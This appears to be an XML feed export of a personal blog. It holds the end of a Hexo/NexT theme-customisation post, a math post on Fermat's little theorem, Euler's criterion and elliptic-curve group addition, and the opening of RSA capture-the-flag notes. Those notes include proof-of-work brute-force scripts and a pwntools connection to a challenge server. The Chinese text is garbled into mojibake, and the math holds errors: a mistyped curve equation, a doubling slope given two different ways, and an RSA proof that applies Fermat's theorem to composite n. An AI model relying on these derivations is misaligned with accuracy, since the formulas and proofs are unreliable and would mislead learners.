language_">window</span>.<span class="property">mozRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">oRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">msRequestAnimationFrame</span>||<span class="keyword">function</span>(<span class="params">n</span>)&#123;<span class="variable language_">window</span>.<span class="built_in">setTimeout</span>(n,<span class="number">1e3</span>/<span class="number">45</span>)&#125;,x=<span class="title class_">Math</span>.<span class="property">random</span>,w=&#123;<span class="attr">x</span>:<span class="literal">null</span>,<span class="attr">y</span>:<span class="literal">null</span>,<span class="attr">max</span>:<span class="number">2e4</span>&#125;;u.<span class="property">id</span>=d,u.<span class="property">style</span>.<span class="property">cssText</span>=<span class="string">&quot;position:fixed;top:0;left:0;z-index:&quot;</span>+m.<span class="property">z</span>+<span class="string">&quot;;opacity:&quot;</span>+m.<span class="property">o</span>,<span class="title function_">e</span>(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(u),<span class="title function_">o</span>(),<span class="variable language_">window</span>.<span class="property">onresize</span>=o,<span class="variable language_">window</span>.<span class="property">onmousemove</span>=<span class="keyword">function</span>(<span class="params">n</span>)&#123;n=n||<span class="variable language_">window</span>.<span class="property">event</span>,w.<span class="property">x</span>=n.<span class="property">clientX</span>,w.<span class="property">y</span>=n.<span class="property">clientY</span>&#125;,<span class="variable language_">window</span>.<span class="property">onmouseout</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;w.<span class="property">x</span>=<span class="literal">null</span>,w.<span class="property">y</span>=<span class="literal">null</span>&#125;;<span class="keyword">for</span>(<span class="keyword">var</span> y=[],s=<span class="number">0</span>;m.<span class="property">n</span>&gt;s;s++)&#123;<span class="keyword">var</span> f=<span class="title function_">x</span>()*c,h=<span class="title function_">x</span>()*a,g=<span class="number">2</span>*<span class="title function_">x</span>()-<span class="number">1</span>,p=<span class="number">2</span>*<span class="title function_">x</span>()-<span class="number">1</span>;y.<span class="title function_">push</span>(&#123;<span class="attr">x</span>:f,<span class="attr">y</span>:h,<span class="attr">xa</span>:g,<span class="attr">ya</span>:p,<span class="attr">max</span>:<span class="number">6e3</span>&#125;)&#125;<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">i</span>()&#125;,<span class="number">100</span>)&#125;();</span><br></pre></td></tr></table></figure>

<h2 id="add-path"><a href="#add-path" class="headerlink" title="add path"></a>add path</h2><p>My NexT layout file is in the path <code>themes\next\layout\_layout.njk</code>.</p>
<p>For we created the js file, we saved as <code>canvas-nest.js</code>. Open the <code>_layout.njk</code>, and add the following words. <em>REMEMBER above the <code>&lt;/body&gt;</code></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Background picture --&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot; src=&quot;/js/canvas-nest.js&quot;&gt;	   &lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h1 id="ICON"><a href="#ICON" class="headerlink" title="ICON"></a>ICON</h1><blockquote>
<p><a href="https://fontawesome.com/search">https://fontawesome.com/search</a></p>
</blockquote>
<h1 id="ATTACH-FILES"><a href="#ATTACH-FILES" class="headerlink" title="ATTACH FILES"></a>ATTACH FILES</h1><p>We may hope visitors that can download files easily and conveniently. Thus, we can upload our relating files onto the same name file. Eg. The post is named <code>22-10-21-hexo-build-beautify.md</code>, and its same name file is <code>22-10-21-hexo-build-beautify</code>. They are created at the same time. </p>
<p>After uploading, and you can quote the file path in the post. And we can download these things while visiting. </p>
<ul>
<li>Picture <code>![filename](filepath)</code></li>
<li>Zip <code>[filename](filepath)</code></li>
<li>â€¦â€¦</li>
</ul>
<p><em>At the same path!</em></p>
<h1 id="FOLK-ME"><a href="#FOLK-ME" class="headerlink" title="FOLK  ME"></a>FOLK  ME</h1><p>The function is in<code>layout.njk</code>.</p>
<p>in <code>headband</code> module add the following code: </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;your url&quot;</span> <span class="attr">class</span>=<span class="string">&quot;github-corner&quot;</span> <span class="attr">aria-label</span>=<span class="string">&quot;View source on GitHub&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;80&quot;</span> <span class="attr">height</span>=<span class="string">&quot;80&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 250 250&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:#fff; color:#151513; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">style</span>=<span class="string">&quot;transform-origin: 130px 106px;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-arm&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-body&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;<span class="keyword">@keyframes</span> octocat-wave&#123;<span class="number">0%</span>,<span class="number">100%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">0</span>)&#125;<span class="number">20%</span>,<span class="number">60%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(-<span class="number">25deg</span>)&#125;<span class="number">40%</span>,<span class="number">80%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">10deg</span>)&#125;&#125;<span class="keyword">@media</span> (<span class="attribute">max-width</span>:<span class="number">500px</span>)&#123;<span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:none&#125;<span class="selector-class">.github-corner</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ensure that the <code>pjax</code> in <code>_config.next.yml</code> is <code>true</code></p>
<h1 id="TITLE-CASE"><a href="#TITLE-CASE" class="headerlink" title="TITLE CASE"></a>TITLE CASE</h1><p>to make the titles follow the standard of title, we can turn the <code>titlecase</code> into <code>true</code></p>
<img src="/2022/10/21/22-10-21-hexo-build-beautify/1.png" class="" title="image-20230224144610422">



<h1 id="DAY-x2F-NIGHT-MODE"><a href="#DAY-x2F-NIGHT-MODE" class="headerlink" title="DAY&#x2F;NIGHT MODE"></a>DAY&#x2F;NIGHT MODE</h1><blockquote>
<p><a href="https://www.techgrow.cn/posts/abf4aee1.html">Hexo Next 8.x ä¸»é¢˜æ·»åŠ å¯åˆ‡æ¢çš„æš—é»‘æ¨¡å¼ | Clay çš„æŠ€æœ¯åšå®¢ (techgrow.cn)</a></p>
</blockquote>
<p><strong>TBC</strong></p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>self_promtion</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-15-Math</title>
    <url>/2022/11/15/22-11-15-math/</url>
    <content><![CDATA[<p>Some import theorems which are suitable for applying to Cryptography.</p>
<p>At the same time, the post which is made as the record to note me that how to improve or deduction. </p>
<span id="more"></span><!--toc-->

<h1 id="Fermatâ€™s-little-theorem"><a href="#Fermatâ€™s-little-theorem" class="headerlink" title="Fermatâ€™s little theorem"></a>Fermatâ€™s little theorem</h1><p>Let $p$ be a prime number,  and $a$ be any integer. Then $a^{p} - a$ is always divisible by $p$. </p>
<p>And we can write as:<br>$$<br>a^{p} \equiv a \mod p<br>$$<br>Make a deduction, we can get that:<br>$$<br>a^{p-1} \equiv 1 \mod p<br>$$</p>
<h1 id="Eulerâ€™s-criterion"><a href="#Eulerâ€™s-criterion" class="headerlink" title="Eulerâ€™s criterion"></a>Eulerâ€™s criterion</h1><p>If the modulo $p$ is a odd prime and is prime to $a$, we can get $a^{p-1}\equiv 1 \mod p$ by using the fermatâ€™s little theorem. </p>
<p>We define that $p &#x3D; 2q + 1$ï¼Œ and we will get $a^{2q} \equiv 1 \mod p$:<br>$$<br>\Longrightarrow (a^{2q} - 1) \times (2^{2q} + 1) \equiv 0 \mod p<br>$$<br>So the $a^q \equiv \pm 1 \mod p$ï¼Œmeans that $a^{\frac{p-1}{2}} \equiv \pm 1 \mod p$. </p>
<p>In fact, we have the equation which is called eulerâ€™s criterion.<br>$$<br>(\frac{a}{p}) \equiv a^{\frac{p - 1}{2}} \mod p<br>$$</p>
<h1 id="Groups-and-Abelian-group"><a href="#Groups-and-Abelian-group" class="headerlink" title="Groups and Abelian group"></a>Groups and Abelian group</h1><p>Usually needs to satisfy the qualities below.</p>
<p>é¦–å…ˆè¯´ä¸‹ç¾¤è®ºçš„åŸºç¡€ã€‚ä»£æ•°ä¸­çš„ç¾¤ç®€å•æ¥è¯´å°±æ˜¯ä¸€ç»„å…ƒç´ é›†åˆå’Œå®šä¹‰åœ¨å…ƒç´ ä¸Šçš„è¿ç®—ã€‚æ¯”å¦‚è¯´å…¨ä½“æ•´æ•°æ„æˆäº†ä¸€ä¸ªç¾¤ï¼Œè¿ç®—åŒ…æ‹¬åŠ æ³•ç­‰ã€‚è¿™é‡Œçš„é›†åˆç”¨ Gï¼ˆgroupï¼‰è¡¨ç¤ºï¼Œé›†åˆè¦å˜æˆç¾¤ï¼Œä¸€èˆ¬è¦æ»¡è¶³ä»¥ä¸‹æ€§è´¨ï¼š</p>
<ol>
<li>å°é—­æ€§ï¼šå¦‚æœ $a$ å’Œ $b$ éƒ½å±äº $G$ é›†åˆï¼Œé‚£ä¹ˆ $a+b$ ä¹Ÿå±äº$G$;</li>
<li>ç»“åˆå¾‹ï¼š$(a+b)+c&#x3D;a+(b+c)$</li>
<li>å­˜åœ¨å•ä½å…ƒï¼ˆ<em>åœ¨äºŒå…ƒè¿ç®—ä¸­ï¼Œå•ä½å…ƒæŒ‡ä¸ä»»æ„å…ƒç´ è¿ç®—ä¸æ”¹å˜å…¶å€¼çš„å…ƒç´ ï¼Œä»¥å®æ•°ä¸ºä¾‹ï¼Œä¹˜æ³•å•ä½å…ƒä¸º1ï¼ŒåŠ æ³•å•ä½å…ƒä¸º0</em>ï¼‰$O$ ä½¿å¾—$a+O&#x3D;O+a&#x3D;a$ ;</li>
</ol>
<p>4.æ¯ä¸ªå…ƒç´ éƒ½å­˜åœ¨é€†å…ƒç´ ï¼Œå°±æ˜¯è¯´å¯¹äºä»»æ„å…ƒç´  $a$ å¿…å­˜åœ¨ $b$ ä½¿å¾— $a+b&#x3D;O$ ($O$æ˜¯å•ä½å…ƒ) ã€‚</p>
<p>é›†åˆæ»¡è¶³ä»¥ä¸Šå››ä¸ªæ€§è´¨å°±æ˜¯ç§°ä¸ºç¾¤ï¼Œè¿˜æœ‰ä¸€äº›ç‰¹æ®Šçš„ç¾¤ï¼Œå¦‚é˜¿è´å°”ç¾¤ï¼ˆAbelian Groupï¼‰é™¤äº†æ»¡è¶³ç¾¤çš„åŸºæœ¬æ€§è´¨ï¼Œè¿˜æ»¡è¶³äº¤æ¢å¾‹å³ï¼š<br>$$<br>a+b&#x3D;b+a<br>$$<br>æ•…é˜¿è´å°”ç¾¤åˆç§°äº¤æ¢ç¾¤ã€‚æ ¹æ®è¿™äº›æ€§è´¨ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“æ•´æ•°é›†Zæ˜¯ä¸€ä¸ªé˜¿è´å°”ç¾¤ï¼Œè‡ªç„¶æ•°é›†Nå´å¹¶ä¸æ˜¯ä¸€ä¸ªç¾¤ï¼Œå› ä¸ºå®ƒä¸æ»¡è¶³ç¬¬å››æ¡æ€§è´¨ã€‚</p>
<h2 id="Elliptic-Curve-Group"><a href="#Elliptic-Curve-Group" class="headerlink" title="Elliptic Curve Group"></a>Elliptic Curve Group</h2><p><strong>æ¤­åœ†æ›²çº¿ä¸Šçš„ç¾¤å…ƒç´ æ˜¯æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹</strong> å•ä½å…ƒæ˜¯æ— ç©·è¿œç‚¹è®°ä¸º $O$</p>
<p>ä»»æ„ç‚¹ $P$ çš„é€†æ˜¯è¯¥ç‚¹å…³äº $x$  è½´å¯¹ç§°ç‚¹ã€‚</p>
<p>æ¤­åœ†æ›²çº¿ç¾¤çš„åŠ æ³•ä¹Ÿä¸åŒäºæ•´æ•°çš„åŠ æ³•ï¼Œå®ƒçš„åŠ æ³•å®šä¹‰å¯ä»¥æè¿°ä¸ºï¼š</p>
<p>ç»™å®šä¸‰ä¸ªå…±çº¿éé›¶çš„ç‚¹ $P$ ï¼Œ$Q$ï¼Œ$R$ ï¼Œå®ƒä»¬çš„å’Œä¸º $P+Q+R&#x3D;O$ã€‚</p>
<h3 id="å‡ ä½•æ„ä¹‰"><a href="#å‡ ä½•æ„ä¹‰" class="headerlink" title="å‡ ä½•æ„ä¹‰"></a>å‡ ä½•æ„ä¹‰</h3><p>è¿‡ $ğ‘ƒ$ ã€$ğ‘„$ ä¸¤ç‚¹åšç›´çº¿ $ğ¿$ï¼Œä¸æ¤­åœ†æ›²çº¿ç›¸äº¤äºç¬¬ä¸‰ç‚¹ï¼Œè¯¥ç‚¹å…³äº $x$ è½´çš„å¯¹ç§°ç‚¹å³æ˜¯æ‰€æ±‚çš„ $ğ‘…$ ç‚¹ã€‚æ¤­åœ†æ›²çº¿çš„è¿™ç§åŠ æ³•è¿ç®—æœ‰æ¯”è¾ƒæ˜ç¡®çš„å‡ ä½•å«ä¹‰ã€‚</p>
<h3 id="å¼‚å¸¸æƒ…å†µ"><a href="#å¼‚å¸¸æƒ…å†µ" class="headerlink" title="å¼‚å¸¸æƒ…å†µ"></a>å¼‚å¸¸æƒ…å†µ</h3><ol>
<li>$ğ‘‚+ğ‘‚&#x3D;ğ‘‚$ï¼Œå¯¹ä»»æ„çš„ $ğ‘ƒ$ï¼Œæœ‰ $ğ‘ƒ+ğ‘‚&#x3D;ğ‘ƒ$ ï¼›$ğ‘‚$çœ‹åšé›¶ç‚¹</li>
<li>$ğ‘ƒ&#x3D;(ğ‘¥,ğ‘¦)$ çš„è´Ÿå…ƒæ˜¯å…³äº $x$ ä¸­å¯¹ç§°çš„ç‚¹ $âˆ’ğ‘ƒ&#x3D;(ğ‘¥,âˆ’ğ‘¦)$ï¼ˆè€Œä¸æ˜¯å…³äºåŸç‚¹å¯¹ç§°ï¼‰ï¼Œ$ğ‘ƒ+(âˆ’ğ‘ƒ)&#x3D;ğ‘‚$ï¼Œå¯ä»¥çœ‹åš $P$ ä¸ $-P$ è¿çº¿ä¸æ¤­åœ†æ›²çº¿ç›¸äº¤äºæ— ç©·è¿œç‚¹</li>
<li>è®¡ç®— $ğ‘ƒ$ ç‚¹ï¼ˆ$ğ‘ƒâ‰ ğ‘‚$ï¼‰çš„ä¸¤å€æ—¶ï¼Œæ˜¯åšè¯¥ç‚¹çš„åˆ‡çº¿ï¼Œå†å–åˆ‡çº¿ä¸æ¤­åœ†æ›²çº¿äº¤ç‚¹ $ğ‘†$ å…³äº $x$ è½´çš„å¯¹ç§°ç‚¹$âˆ’ğ‘†$ï¼Œä¹Ÿå³æ˜¯ $2ğ‘ƒ&#x3D;ğ‘ƒ+ğ‘ƒ&#x3D;âˆ’ğ‘†$ ï¼Œå¾—å‡º2å€å€¼å¯ä»¥é€’æ¨åˆ°è‹¥å¹²å€ã€‚</li>
</ol>
<p>å¯ä»¥çœ‹å‡ºï¼Œæ¤­åœ†æ›²çº¿çš„ç‚¹é›†ï¼ˆåŒ…å«æ— ç©·è¿œç‚¹$O$ï¼‰å’Œä¸Šè¿°å®šä¹‰çš„åŠ æ³•è¿ç®—æ„æˆäº†ä¸€ä¸ªé˜¿è´å°”ç¾¤ï¼š<br>å•ä½å…ƒæ˜¯ $ğ‘‚$ ç‚¹ï¼Œ$ğ‘ƒ(ğ‘¥,ğ‘¦)$ çš„é€†å…ƒæ˜¯ $ğ‘ƒ(ğ‘¥,âˆ’ğ‘¦)$ ï¼Œå°é—­æ€§ï¼Œç»“åˆæ€§ä»¥åŠäº¤æ¢æ€§ä¹Ÿæ˜¯æ˜¾ç„¶æ»¡è¶³çš„ã€‚</p>
<h3 id="æ¤­åœ†æ›²çº¿ä»£æ•°è®¡ç®—"><a href="#æ¤­åœ†æ›²çº¿ä»£æ•°è®¡ç®—" class="headerlink" title="æ¤­åœ†æ›²çº¿ä»£æ•°è®¡ç®—"></a>æ¤­åœ†æ›²çº¿ä»£æ•°è®¡ç®—</h3><p>å‡ ä½•è§£é‡Šä¸»è¦æ–¹ä¾¿ç†è§£æ¤­åœ†æ›²çº¿çš„åŠ æ³•æ„ä¹‰ï¼Œä»£æ•°ä¾¿äºè®¡ç®—ã€‚è¿‡æ›²çº¿ $P(x_p, y_p)$ä»¥åŠ $Q(x_q, y_q)$ä¸¤ç‚¹ï¼ˆ*$P$ ä¸ $Q$ ä¸äº’ä¸ºè´Ÿå…ƒ*ï¼‰åšç›´çº¿ï¼Œæ±‚ç¬¬ä¸‰ä¸ªäº¤ç‚¹å¾ˆå®¹æ˜“ç”¨ä»£æ•°æ±‚è§£å‡ºæ¥ã€‚<br>$$<br>y^2 &#x3D; x_3 + ax + b \tag{1}<br>$$</p>
<p>$$<br>y - y_p &#x3D; k(x - x_p) \tag{2}<br>$$</p>
<p>äºæ˜¯æ–œç‡ä¸º$k &#x3D; \frac{y_q - y_p}{x_q - x_p}$ï¼ˆ $P$ ä¸ $Q$ ä¸åŒç‚¹ï¼‰&#x2F; $k &#x3D; \frac{3x_{q}^2 + a}{3y_p}$ï¼ˆ $P$ ä¸ $Q$ ç›¸åŒç‚¹ï¼‰ ã€‚</p>
<p>å°†$(2)$ä»£å…¥$(1)$å†åˆ©ç”¨æ¬¡æ•°å¯¹é½çš„æ–¹æ³•ä»è€Œæ±‚å¾—ç¬¬ä¸‰ä¸ªäº¤ç‚¹çš„å¯¹ç§°ç‚¹ï¼Œä¹Ÿå°±æ˜¯$P,Q$ä¹‹å’Œ$R(x_r, y_r)$ä¸ºï¼š<br>$$<br>x_r &#x3D; k^2 - x_p - x_q<br>$$</p>
<p>$$<br>y_r &#x3D; -y_p + k(x_p - x_r)<br>$$</p>
<p>å¦‚æœ $P &#x3D; Q$ï¼Œåˆ™ä¸¤è€…ç›¸åŠ ä¸ºå€ä¹˜è¿ç®—ã€‚ä¾‹å¦‚ $P+P &#x3D; 2P &#x3D; R$ã€‚<br>$$<br>x_r &#x3D; ((3x_p^{2} + a)&#x2F;2y_p)^2 - 2x_p<br>$$</p>
<p>$$<br>y_r &#x3D; ((3x_p^{2} + a)&#x2F;2y_p)(x_p - x_r) - y_p<br>$$</p>
<ul>
<li><a href="https://learnblockchain.cn/article/1549">https://learnblockchain.cn/article/1549</a></li>
</ul>
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>fermat_little_theorem</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-04-RSA</title>
    <url>/2022/11/04/22-11-04-RSA/</url>
    <content><![CDATA[<p><strong>JUST</strong> conclude the attacks about RSA. </p>
<p>Make a record for myself. </p>
<span id="more"></span>



<h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h2><ul>
<li>produce large primes $p$ and $q$</li>
<li>calculate $n &#x3D; p \times q$</li>
<li>use <strong>Eulerâ€™s totient function</strong> to get $\varphi(n) &#x3D; (p-1) \times (q-1)$, in code we usually use $N$ or $phi$</li>
<li>define $e$ which satisfies the condition that $gcd(e, \varphi(n)) &#x3D; 1$, and the $e$ is between 1 and $\varphi(n)$</li>
<li>calculate $d$ and the $d$ comes from $de \equiv 1 \mod \varphi(n)$</li>
<li><strong>encrypt: $c \equiv m^{e} \mod n$</strong></li>
<li><strong>decrypt: $m \equiv c^{d} \mod n$</strong></li>
<li>PUBLICKEY: PU{e, n}</li>
<li>PRIVATEKEY: PR{p, q, d}</li>
</ul>
<h2 id="Proof"><a href="#Proof" class="headerlink" title="Proof"></a>Proof</h2><p>$$<br>m \equiv c^{d} \mod n \equiv m^{de} \mod n \equiv m^{k\varphi(n) + 1} \mod n \equiv m \mod n<br>$$</p>
<p>use the <strong>Fermatâ€™s little theorem</strong> deduce:<br>$$<br>m^{n} \equiv m \mod n\<br>$$</p>
<p>$$<br>m^{n-1} \equiv m^{\varphi(n)} \equiv 1 \mod n\<br>$$</p>
<h3 id="m-n-are-relatively-prime"><a href="#m-n-are-relatively-prime" class="headerlink" title="$m$, $n$ are relatively-prime"></a>$m$, $n$ are relatively-prime</h3><p>the $m^{k\varphi(n)}$:<br>$$<br>m^{k\varphi(n)} \equiv 1\mod n\<br>$$</p>
<p>$$<br>\Longrightarrow m^{k\varphi(n) + 1} \equiv m \mod n<br>$$</p>
<h3 id="m-n-not-relatively-prime"><a href="#m-n-not-relatively-prime" class="headerlink" title="$m$,$n$ not relatively-prime"></a>$m$,$n$ not relatively-prime</h3><p>preparation:<br>$$<br>gcd(m, n) \neq 1\<br>$$<br>$$<br>n &#x3D; p \times q\<br>$$</p>
<p>$$<br>\Longrightarrow n &#x3D; kp\<br>$$</p>
<p>$$<br>k, p \ are \ relatively-prime<br>$$</p>
<p>also <strong>Fermatâ€™s little theorem</strong>:<br>$$<br>(kp)^{q-1} \equiv 1 \mod q<br>$$<br>based on the properties of con-gruences multiplication property:<br>$$<br>(kp)^{(p-1)\times (q-1) \times k} (kp) \equiv (kp) \mod q<br>$$<br>substitute the $\varphi(n)$ and $de \equiv 1 \mod \varphi(n)$:<br>$$<br>\varphi(n) &#x3D; (p-1) \times (q-1)\<br>$$<br>$$<br>de &#x3D; 1 + k \times \varphi(n)\<br>$$</p>
<p>$$<br>\Longrightarrow (kp)^{de} \equiv (kp) \mod q\<br>$$</p>
<p>$$<br>\Longrightarrow (kp)^{de}&#x3D;kp + tq<br>$$</p>
<p>thus, $tq | kq$ and $t|p$ for $q$ is prime:<br>$$<br>assume: t &#x3D; t\times p\<br>$$<br>$$<br>(kp)^{de} &#x3D; tq + kp &#x3D; t\times p\times q + k \times p &#x3D; tn + kp\<br>$$</p>
<p>$$<br>(kp)^{de} &#x3D; m + tn \equiv m \mod n<br>$$</p>
<p>proved.</p>
<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><ul>
<li>gmpy2</li>
<li>python3.7+</li>
<li>pycharm</li>
<li>sagemath</li>
</ul>
<h1 id="NC-CHALLENGE"><a href="#NC-CHALLENGE" class="headerlink" title="NC CHALLENGE"></a>NC CHALLENGE</h1><p>Before nc real connection, you need to receive the challenge and make a solution about it.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters, punctuation</span><br><span class="line">alpha_bet = digits+ascii_letters+punctuation</span><br><span class="line">strlist = itertools.product(alpha_bet, repeat=<span class="number">4</span>)</span><br><span class="line">sha256 = <span class="string">&#x27;9a579edf6cdd9ed39efc1ccc754e7bb15d52e3d9cabcd66c7042fa1a59fc2836&#x27;</span></span><br><span class="line">tail = <span class="string">&#x27;j60BfGY9sSnkMi9H&#x27;</span></span><br><span class="line">xxxx = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    data = i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    data_sha = hashlib.sha256((data+<span class="built_in">str</span>(tail)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(data_sha == sha256):</span><br><span class="line">        xxxx = data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(xxxx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># çˆ†ç ´sha256+hex</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase1</span>(<span class="params">pre, target</span>):</span><br><span class="line">    pre = codecs.decode(pre.encode(), <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">256</span>), repeat=<span class="number">3</span>):</span><br><span class="line">        skr = pre + <span class="string">b&#x27;&#x27;</span>.join([t.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> t <span class="keyword">in</span> x])</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(skr).hexdigest() == target:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;find <span class="subst">&#123;skr&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> codecs.encode(skr, <span class="string">&#x27;hex&#x27;</span>).decode()</span><br></pre></td></tr></table></figure>

<p><em>change sha256&#x2F;tail and crack xxxx</em></p>
<p>Or use the connecting function: </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">r = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28826</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;sha256(XXXX&#x27;</span>)</span><br><span class="line">    line = r.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line">    tmp = line[line.find(<span class="string">&#x27;+&#x27;</span>) + <span class="number">1</span>:line.find(<span class="string">&#x27;)&#x27;</span>)]</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    aim = line[line.find(<span class="string">&#x27;== &#x27;</span>) + <span class="number">3</span>:]</span><br><span class="line">    <span class="built_in">print</span>(aim)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> table:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> table:</span><br><span class="line">                    ans = i + j + k + l</span><br><span class="line">                    <span class="keyword">if</span> hashlib.sha256((ans + tmp).encode()).hexdigest() == aim:</span><br><span class="line">                        <span class="built_in">print</span>(ans)</span><br><span class="line">                        r.recvuntil(<span class="string">b&#x27;Give me XXXX: &#x27;</span>)</span><br><span class="line">                        r.sendline(ans.encode())</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">proof()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="MODULUS-FACTORIZATION"><a href="#MODULUS-FACTORIZATION" class="headerlink" title="MODULUS FACTORIZATION"></a>MODULUS FACTORIZATION</h1><p>Or we can call it <code>Original_RSA</code>. </p>
<p>The main target in RSA problems is to factorize <code>n</code> to <code>p</code> and <code>q</code>. </p>
